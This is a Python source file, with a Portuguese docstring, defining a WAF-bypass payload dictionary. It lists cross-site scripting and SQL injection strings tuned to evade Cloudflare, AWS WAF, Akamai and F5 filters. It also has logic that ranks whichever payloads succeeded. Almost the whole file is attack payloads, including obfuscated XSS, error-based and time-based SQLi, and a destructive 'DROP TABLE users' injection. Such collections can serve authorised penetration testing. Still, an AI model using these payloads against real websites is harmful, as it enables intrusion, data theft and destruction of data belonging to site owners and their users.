from typing import Dict, List, Optional


class WAFBypassDictionary:
    """
    Payload sets por fornecedor de WAF.

    Formato de retorno: [{"id": "...", "payload": "..."}]
    """

    PAYLOADS: Dict[str, Dict[str, List[str]]] = {
        "cloudflare": {
            "xss": [
                "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
                "<svg onload=confirm()`XSS`>",
                "\"><script>alert?.(1)</script>",
                "<<script>alert(1)</script>",
                "<a href=\"j&#x61;v&#x61;s&#x63;r&#x69;p&#x74;:alert(1)\">click</a>",
                "＜img src=p onerror=＇prompt(1)＇＞",
            ],
            "sqli": [
                "'=1='1",
                "'=0='1",
                "'=10-(length(current_user))='1",
                "'=POSITION(binary+'a'+IN+current_user)='1",
                "1 AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            ],
        },
        "aws_waf": {
            "xss": [
                "%253Cscript%253Ealert(1)%253C/script%253E",
                "<script>eval(atob(\"YWxlcnQoMSk=\"))</script>",
                "<body onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
                "<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
            ],
            "sqli": [
                "1/*!50000union*//*!50000select*/1,2,3--",
                "1 union select 1,2,3 from dual where 1=1--",
                "1 and 1=2 union select 1,2,3",
            ],
        },
        "akamai": {
            "xss": [
                "<script>alert`1`</script>",
                "<img src=\"x\" onerror=\"window['aler'+'t'](1)\">",
                "<iframe src=\"javascript:alert(1)\"></iframe>",
            ],
            "sqli": [
                "1 UNION SELECT 1,2,3,4,5--",
                "1 AND SLEEP(5) AND 1=1",
                "1 AND BENCHMARK(5000000,MD5(CHAR(115,113,108)))",
            ],
        },
        "f5": {
            "xss": [
                "<script>alert(1)//",
                "<script>alert(1)</script  //",
                "<script>alert(1)</script x>",
            ],
            "sqli": [
                "1' OR '1'='1'/*",
                "1') OR ('1'='1",
                "1 and 1=1-- -",
            ],
        },
        "generic": {
            "xss": [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ],
            "sqli": [
                "' OR '1'='1",
                "1 AND 1=1",
                "1 UNION SELECT NULL--",
                "1; DROP TABLE users--",
            ],
        },
    }

    def __init__(self):
        self.adaptive: Dict[str, Dict[str, List[str]]] = {}

    def get_payloads(
        self, vendor: Optional[str], attack_type: str, previous_results: Optional[Dict] = None
    ) -> List[Dict[str, str]]:
        key = (vendor or "generic").lower()
        payloads = self.PAYLOADS.get(key, self.PAYLOADS["generic"]).get(attack_type, [])

        adaptive = self.adaptive.get(key, {}).get(attack_type, [])
        ordered = adaptive + payloads

        results: List[Dict[str, str]] = []
        for idx, payload in enumerate(ordered):
            results.append({"id": f"{key}_{attack_type}_{idx}", "payload": payload})
        return results

    def record_success(self, vendor: str, attack_type: str, payload: str):
        vendor = (vendor or "generic").lower()
        self.adaptive.setdefault(vendor, {}).setdefault(attack_type, [])
        store = self.adaptive[vendor][attack_type]
        if payload in store:
            store.remove(payload)
        store.insert(0, payload)
        self.adaptive[vendor][attack_type] = store[:10]
